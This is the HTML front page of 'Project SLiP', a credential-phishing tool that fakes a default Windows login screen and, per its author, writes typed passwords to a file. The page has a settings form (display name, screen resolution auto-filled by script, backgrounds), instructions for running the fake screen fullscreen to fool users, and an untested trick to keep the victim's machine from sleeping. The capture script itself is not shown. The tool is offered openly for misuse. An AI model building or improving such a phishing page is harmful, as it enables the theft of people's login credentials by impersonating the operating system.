<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
	<title>Project SLiP</title>
	<meta name="keywords" content="" />
	<meta name="description" content="" />
	
</head>
<body>
<p>
<H1>Project SLiP</H1>
<H2><u>S</u>uper <u>L</u>og<u>i</u>n <u>P</u>hish</H2>
With help of this site you can spoof a very default windows login screen. (Close enough for DAUs, i hope)</br>
The typed in password will be written in a file as of now. </br>
In the future i want to add a few small features like choosing different backgrounds, supporting more resolutions, </br>
different languages and simulating the few seconds of waiting after entering your password with a loading animation.</br></br>

<H2>How to use:</H2>
You have to open this page (index) and set your settings. Then you have to open the phishing page with the button.</br>
The newly opened page is a javascript-called window and can close itself after entering the "password" (Due to some javascript restrictions).</br>
Now close the first page and make the phishing page fullscreen. Have fun!


<H2>Settings</H2>

<form action="phish.php" target="_blank" method="GET">
Name to display as Windows user: <input type="text" name="displayname"></br>
Resolution Width:  <input type="text" id="rewidth" name="rewidth"></br>
Resolution Height: <input type="text" id="reheight" name="reheight"></br>
Background Image: 	</br>
					<input type="radio" name="background" value="url(images/def_background.jpg)" checked> Blue Windows Logo (Original size 1920x1200)<br>
					<input type="radio" name="background" value="url(images/cave.jpg)"> Beach Cave (Original size 3840×2160)<br>
					<input type="radio" name="background" value="url(images/mountainsee.png)"> Mountain see (Original size 1920x1200)<br>
					<input type="radio" name="background" value="url(images/mountainbiker.jpg)"> Biker on mountain (Original size 1920x1200)<br>
					<input type="radio" name="background" value="url(images/plainblue.jpg)"> Plain blue (the Win10 blue)<br>


<script>
		var screenheight = window.screen.height;
		var screenwidth = window.screen.width;
		document.getElementById("rewidth").value = screenwidth;
		document.getElementById("reheight").value = screenheight;
</script>

</p>


<button>Test yourself!</button>



<H2>Antisleep</H2>
i have added a javascript from here https://github.com/ivanmaeder/computer-sleep </br>
It should play a soundfile without sound in the background.</br>
I have not tested it!! But i know that at least Firefox needs to whitelist the site to autoplay media. You can do that in the url bar on the very left. </br>
Again: untested!

</body>
</html>